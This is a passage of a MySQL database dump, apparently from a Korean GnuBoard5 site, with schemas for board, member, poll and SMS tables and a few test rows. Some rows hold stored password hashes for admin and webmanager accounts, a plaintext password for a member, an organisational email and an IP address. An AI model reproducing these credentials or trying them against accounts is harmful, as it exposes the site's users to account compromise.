) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_request`
--

LOCK TABLES `g5_write_request` WRITE;
/*!40000 ALTER TABLE `g5_write_request` DISABLE KEYS */;
INSERT INTO `g5_write_request` VALUES (1,-1,'',1,0,0,'','','','상담 요청입니다','상담 요청입니다.','','',0,0,'',1,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 03:08:20',0,'2013-05-25 03:08:20','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_request` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_service`
--

DROP TABLE IF EXISTS `g5_write_service`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_service` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_service`
--

LOCK TABLES `g5_write_service` WRITE;
/*!40000 ALTER TABLE `g5_write_service` DISABLE KEYS */;
INSERT INTO `g5_write_service` VALUES (1,-1,'',1,0,0,'','','html1','서비스 내용1','서비스 내용1<br />','','',0,0,'',14,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2012-10-10 01:51:05',0,'2012-10-10 01:51:05','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','html1','서비스 내용2','서비스 내용2<br />','','',0,0,'',29,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2012-10-10 01:51:53',0,'2012-10-10 01:51:53','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_service` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_word_rec`
--

DROP TABLE IF EXISTS `g5_write_word_rec`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_word_rec` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_word_rec`
--

LOCK TABLES `g5_write_word_rec` WRITE;
/*!40000 ALTER TABLE `g5_write_word_rec` DISABLE KEYS */;
INSERT INTO `g5_write_word_rec` VALUES (1,-1,'',1,0,0,'','','','테스트 중입니다.','테스트 중....','','',0,0,9,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-02-12 16:21:27',0,'2015-02-12 16:21:27','210.216.54.2','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_word_rec` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_word_text`
--

DROP TABLE IF EXISTS `g5_write_word_text`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_word_text` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_word_text`
--

LOCK TABLES `g5_write_word_text` WRITE;
/*!40000 ALTER TABLE `g5_write_word_text` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_write_word_text` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_zip`
--

DROP TABLE IF EXISTS `g5_zip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_zip` (
  `zp_id` int(11) NOT NULL DEFAULT '0',
  `zp_code` varchar(6) NOT NULL DEFAULT '',
  `zp_sido` varchar(4) NOT NULL DEFAULT '',
  `zp_gugun` varchar(20) NOT NULL DEFAULT '',
  `zp_dong` varchar(50) NOT NULL DEFAULT '',
  `zp_bunji` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`zp_id`),
  KEY `zp_code` (`zp_code`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_zip`
--

LOCK TABLES `g5_zip` WRITE;
/*!40000 ALTER TABLE `g5_zip` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_zip` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `member_member`
--

DROP TABLE IF EXISTS `member_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `member_member` (
  `created` datetime NOT NULL,
  `id` varchar(14) NOT NULL,
  `name` varchar(14) NOT NULL,
  `password` varchar(41) NOT NULL,
  `email` varchar(30) NOT NULL,
  `address` varchar(100) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `birthday` varchar(12) NOT NULL,
  `sbirthday` varchar(12) NOT NULL,
  `position` varchar(30) NOT NULL,
  `region` varchar(20) NOT NULL,
  `church` varchar(20) NOT NULL,
  `memo` longtext NOT NULL,
  `age` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `member_member`
--

LOCK TABLES `member_member` WRITE;
/*!40000 ALTER TABLE `member_member` DISABLE KEYS */;
INSERT INTO `member_member` VALUES ('2015-06-03 08:00:17','charles','??','1234','','','','','','','','','',17);
/*!40000 ALTER TABLE `member_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `polls_choice`
--

DROP TABLE IF EXISTS `polls_choice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `polls_choice` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `choice` varchar(200) NOT NULL,
  `votes` int(11) NOT NULL,
  `poll_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `polls_choice_582e9e5a` (`poll_id`),
  CONSTRAINT `polls_choice_poll_id_672f8d8e836026ff_fk_polls_poll_id` FOREIGN KEY (`poll_id`) REFERENCES `polls_poll` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `polls_choice`
--

LOCK TABLES `polls_choice` WRITE;
/*!40000 ALTER TABLE `polls_choice` DISABLE KEYS */;
/*!40000 ALTER TABLE `polls_choice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `polls_poll`
--

DROP TABLE IF EXISTS `polls_poll`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `polls_poll` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `question` varchar(200) NOT NULL,
  `pub_date` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `polls_poll`
--

LOCK TABLES `polls_poll` WRITE;
/*!40000 ALTER TABLE `polls_poll` DISABLE KEYS */;
/*!40000 ALTER TABLE `polls_poll` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_book`
--

DROP TABLE IF EXISTS `sms5_book`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_book` (
  `bk_no` int(11) NOT NULL AUTO_INCREMENT,
  `bg_no` int(11) NOT NULL DEFAULT '0',
  `mb_no` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bk_name` varchar(255) NOT NULL DEFAULT '',
  `bk_hp` varchar(255) NOT NULL DEFAULT '',
  `bk_receipt` tinyint(4) NOT NULL DEFAULT '0',
  `bk_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `bk_memo` text NOT NULL,
  PRIMARY KEY (`bk_no`),
  KEY `bk_name` (`bk_name`),
  KEY `bk_hp` (`bk_hp`),
  KEY `mb_no` (`mb_no`),
  KEY `bg_no` (`bg_no`,`bk_no`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_book`
--

LOCK TABLES `sms5_book` WRITE;
/*!40000 ALTER TABLE `sms5_book` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_book` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_book_group`
--

DROP TABLE IF EXISTS `sms5_book_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_book_group` (
  `bg_no` int(11) NOT NULL AUTO_INCREMENT,
  `bg_name` varchar(255) NOT NULL DEFAULT '',
  `bg_count` int(11) NOT NULL DEFAULT '0',
  `bg_member` int(11) NOT NULL DEFAULT '0',
  `bg_nomember` int(11) NOT NULL DEFAULT '0',
  `bg_receipt` int(11) NOT NULL DEFAULT '0',
  `bg_reject` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`bg_no`),
  KEY `bg_name` (`bg_name`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_book_group`
--

LOCK TABLES `sms5_book_group` WRITE;
/*!40000 ALTER TABLE `sms5_book_group` DISABLE KEYS */;
INSERT INTO `sms5_book_group` VALUES (1,'미분류',0,0,0,0,0);
/*!40000 ALTER TABLE `sms5_book_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_config`
--

DROP TABLE IF EXISTS `sms5_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_config` (
  `cf_phone` varchar(255) NOT NULL DEFAULT '',
  `cf_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `cf_member` tinyint(4) NOT NULL DEFAULT '1',
  `cf_level` tinyint(4) NOT NULL DEFAULT '2',
  `cf_point` int(11) NOT NULL DEFAULT '0',
  `cf_day_count` int(11) NOT NULL DEFAULT '0',
  `cf_skin` varchar(100) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_config`
--

LOCK TABLES `sms5_config` WRITE;
/*!40000 ALTER TABLE `sms5_config` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_form`
--

DROP TABLE IF EXISTS `sms5_form`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_form` (
  `fo_no` int(11) NOT NULL AUTO_INCREMENT,
  `fg_no` tinyint(4) NOT NULL DEFAULT '0',
  `fg_member` char(1) NOT NULL DEFAULT '0',
  `fo_name` varchar(255) NOT NULL DEFAULT '',
  `fo_content` text NOT NULL,
  `fo_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`fo_no`),
  KEY `fg_no` (`fg_no`,`fo_no`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_form`
--

LOCK TABLES `sms5_form` WRITE;
/*!40000 ALTER TABLE `sms5_form` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_form` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_form_group`
--

DROP TABLE IF EXISTS `sms5_form_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_form_group` (
  `fg_no` int(11) NOT NULL AUTO_INCREMENT,
  `fg_name` varchar(255) NOT NULL DEFAULT '',
  `fg_count` int(11) NOT NULL DEFAULT '0',
  `fg_member` tinyint(4) NOT NULL,
  PRIMARY KEY (`fg_no`),
  KEY `fg_name` (`fg_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_form_group`
--

LOCK TABLES `sms5_form_group` WRITE;
/*!40000 ALTER TABLE `sms5_form_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_form_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_history`
--

DROP TABLE IF EXISTS `sms5_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_history` (
  `hs_no` int(11) NOT NULL AUTO_INCREMENT,
  `wr_no` int(11) NOT NULL DEFAULT '0',
  `wr_renum` int(11) NOT NULL DEFAULT '0',
  `bg_no` int(11) NOT NULL DEFAULT '0',
  `mb_no` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bk_no` int(11) NOT NULL DEFAULT '0',
  `hs_name` varchar(30) NOT NULL DEFAULT '',
  `hs_hp` varchar(255) NOT NULL DEFAULT '',
  `hs_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `hs_flag` tinyint(4) NOT NULL DEFAULT '0',
  `hs_code` varchar(255) NOT NULL DEFAULT '',
  `hs_memo` varchar(255) NOT NULL DEFAULT '',
  `hs_log` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`hs_no`),
  KEY `wr_no` (`wr_no`),
  KEY `mb_no` (`mb_no`),
  KEY `bk_no` (`bk_no`),
  KEY `hs_hp` (`hs_hp`),
  KEY `hs_code` (`hs_code`),
  KEY `bg_no` (`bg_no`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_history`
--

LOCK TABLES `sms5_history` WRITE;
/*!40000 ALTER TABLE `sms5_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_member_history`
--

DROP TABLE IF EXISTS `sms5_member_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_member_history` (
  `mh_no` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(30) NOT NULL,
  `mh_reply` varchar(30) NOT NULL,
  `mh_hp` varchar(30) NOT NULL,
  `mh_datetime` datetime NOT NULL,
  `mh_booking` datetime NOT NULL,
  `mh_log` varchar(255) NOT NULL,
  `mh_ip` varchar(15) NOT NULL,
  PRIMARY KEY (`mh_no`),
  KEY `mb_id` (`mb_id`,`mh_datetime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_member_history`
--

LOCK TABLES `sms5_member_history` WRITE;
/*!40000 ALTER TABLE `sms5_member_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_member_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms5_write`
--

DROP TABLE IF EXISTS `sms5_write`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms5_write` (
  `wr_no` int(11) NOT NULL DEFAULT '1',
  `wr_renum` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(255) NOT NULL DEFAULT '',
  `wr_message` varchar(255) NOT NULL DEFAULT '',
  `wr_booking` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_total` int(11) NOT NULL DEFAULT '0',
  `wr_re_total` int(11) NOT NULL DEFAULT '0',
  `wr_success` int(11) NOT NULL DEFAULT '0',
  `wr_failure` int(11) NOT NULL DEFAULT '0',
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_memo` text NOT NULL,
  KEY `wr_no` (`wr_no`,`wr_renum`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms5_write`
--

LOCK TABLES `sms5_write` WRITE;
/*!40000 ALTER TABLE `sms5_write` DISABLE KEYS */;
/*!40000 ALTER TABLE `sms5_write` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-09-08  7:13:32
